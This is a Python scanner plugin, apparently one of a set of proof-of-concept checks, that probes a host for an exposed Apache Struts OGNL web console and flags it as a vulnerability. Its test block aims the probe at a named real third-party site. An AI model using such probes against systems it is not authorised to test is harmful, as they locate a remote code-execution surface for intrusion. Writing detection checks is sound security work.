from ..miniCurl import Curl
from ..t  import T
#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
POC Name  :  OGNL console
Author    :  a
mail        :  a@lcx.cc
Referer:	http://wooyun.org/bugs/wooyun-2010-080076
"""

import urlparse

class P(T):
    def __init__(self):
        T.__init__(self)
    def verify(self,head='',context='',ip='',port='',productname={},keywords='',hackinfo=''):
        arg='http://'+ip+':'+port
        curl=Curl()
        result = {}
        result['result']=False

        payload = '/struts/webconsole.html'
        url = arg + payload
        code, head, res, errcode, _ = curl.curl('"%s"' % url)
    	
        if code == 200 and "Welcome to the OGNL console" in res:
            output('find ognl console:' +url,result,'info')
            
    

        del curl
        return result


def output(url,result,label):
    info = url + '  struts  Vul '
    result['result']=True
    result['VerifyInfo'] = {}
    result['VerifyInfo']['type']='struts Vul'
    result['VerifyInfo']['URL'] =url
    result['VerifyInfo']['payload']='/root/github/poccreate/thirdparty/www/www_38ab66d936ba162d25c98c1af6623f7c.py'
    result['VerifyInfo']['level']=label
    result['VerifyInfo']['result'] =info

if __name__ == '__main__':
    print P().verify(ip='http://yunlai.cn:803/sfdsfds/',port='80')

#/root/github/poccreate/thirdparty/www/www_38ab66d936ba162d25c98c1af6623f7c.py
#/root/github/poccreate/codesrc/exp-745.py